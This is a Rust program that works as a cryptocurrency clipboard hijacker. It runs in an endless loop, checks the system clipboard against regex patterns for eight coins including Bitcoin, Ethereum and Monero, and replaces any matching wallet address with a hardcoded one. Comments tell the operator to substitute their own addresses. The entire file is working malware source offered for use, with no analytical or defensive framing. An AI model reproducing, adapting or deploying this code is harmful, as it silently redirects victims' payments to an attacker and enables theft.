use regex::Regex;
use cli_clipboard::{ClipboardContext, ClipboardProvider};

struct Wallet {
    name: String,
    address: String,
    regex: Regex,
}
// "btc": "[13][a-km-zA-HJ-NP-Z1-9]{25,34}",
// "bch": "((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}",
// "eth": "0x[a-fA-F0-9]{40}",
// "ltc": "[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}",
// "doge": "D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}",
// "dash": "X[1-9A-HJ-NP-Za-km-z]{33}",
// "xmr": "4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}",
// "neo": "A[0-9a-zA-Z]{33}",
// "xrp": "r[0-9a-zA-Z]{33}"

fn main() {

    let mut ctx = ClipboardContext::new().unwrap();

    let wallets = vec![
        Wallet {
            name: "ethereum".to_string(),
            address: "0xf631817b456af7d9f955a4801987ad47a1bb1787".to_string(), // replace with your etherium address
            regex: Regex::new(r"^0x[a-fA-F0-9]{40}$").unwrap(),
        },
        Wallet {
            name: "bitcoin".to_string(),
            address: "3PehbcFoeaFVm2LiTbYYbfGDkniesvY6zA".to_string(), // replace with your bitcoin address
            regex: Regex::new(r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$").unwrap(),
        },
        Wallet {
            name: "dash".to_string(),
            address: "XpuSFGxi5de984aQUbf2mEHFdwpvMQv1en".to_string(), // replace with your dash address
            regex: Regex::new(r"X[1-9A-HJ-NP-Za-km-z]{33}$").unwrap(),
        },
        Wallet {
            name: "monero".to_string(),
            address: "84FnWj7GHLLPppoehvr5r2enLBBfH5CFB4asdn4HKGXXHWj8nHysDP4RXQv4tbF25o3jaTFzedoBeA69ZFA7mjoVJ7PEeGz".to_string(), // replace with your monero address
            regex: Regex::new(r"4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$").unwrap(),
        },
        Wallet {
            name: "bitcoincash".to_string(),
            address: "bitcoincash:qqtgwjdmaqudy6k6sp4aglvfh3g8nh47hg7pjy87pj".to_string(), // replace with your bitcoincash address
            regex: Regex::new(r"((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}").unwrap(),
        },
        Wallet {
            name: "litecoin".to_string(),
            address: "LQWZomajsRHm4zFmUkdynVwrCbuLCabtqF".to_string(), // replace with your litecoin address
            regex: Regex::new(r"[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}").unwrap(),
        },
        Wallet {
            name: "dogecoin".to_string(),
            address: "D7mbMi14krdHBDkgUzAWUxXKnzGzquyjYF".to_string(), // replace with your dogecoin address
            regex: Regex::new(r"D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}").unwrap(),
        },
        Wallet {
            name: "xrp".to_string(),
            address: "rHcXrn8joXL2Qe7BaMnhB5VRuj1XKEmUW6".to_string(), // replace with your xrp address
            regex: Regex::new(r"r[0-9a-zA-Z]{33}").unwrap(),
        },
    ];

    loop {
        let content = ctx.get_contents().unwrap();

        for wallet in &wallets {
            if wallet.regex.is_match(&content.trim()) {
                if ! &content.trim().eq(&wallet.address) {
                    ctx.set_contents(wallet.address.to_owned()).unwrap();
                }
            }
        } 
    }
}
